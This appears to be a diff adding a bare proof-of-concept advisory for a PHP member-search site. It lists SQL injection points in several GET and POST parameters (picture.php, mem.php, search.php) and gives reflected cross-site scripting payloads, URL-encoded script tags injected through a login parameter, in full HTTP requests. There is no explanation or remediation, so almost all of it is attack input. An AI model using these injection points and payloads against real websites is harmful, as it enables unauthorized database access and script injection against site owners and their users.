@@ -1,0 +1,18 @@
+http://www.example.com/picture.php?pid=1[SQL]
+http://www.example.com/mem.php?mid=1[SQL]
+http://www.example.com/search.php?search=3&amp;sex=1[SQL]
+
+POST /search.php HTTP/1.1
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 97
+pictures=1&amp;search=1&amp;Submit2=1&amp;Submit=1&amp;sex=1&amp;age1=1&amp;age2=1&amp;likes=1&amp;maritalstatus=1&amp;relationship=&#039;[SQL]
+
+http://www.example.com/webmaster/index.php?login=%22%3E%3Cscript%3Ealert%28%2FElipsis%2BSecurity%2BTest%2F%29%3C%2Fscript%3E&amp;pswd=test
+
+POST /search.php HTTP/1.1
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 404
+Cookie: PHPSESSID=d83ded192782c72c7f90adbac4127d7d;pass=test
+sex=1&amp;age1=1&amp;age2=10000&amp;likes=1&amp;maritalstatus=Divorced&amp;relationship=1&amp;pictures=off&amp;onlinet=0&amp;search=&amp;Submit=Search%20%26gt%3B&amp;login=%22%3E%3Cscript%3Ealert%28%2FElipsis%2BSecurity%2BTest%2F%29%3C%2Fscript%3E&amp;fname=1
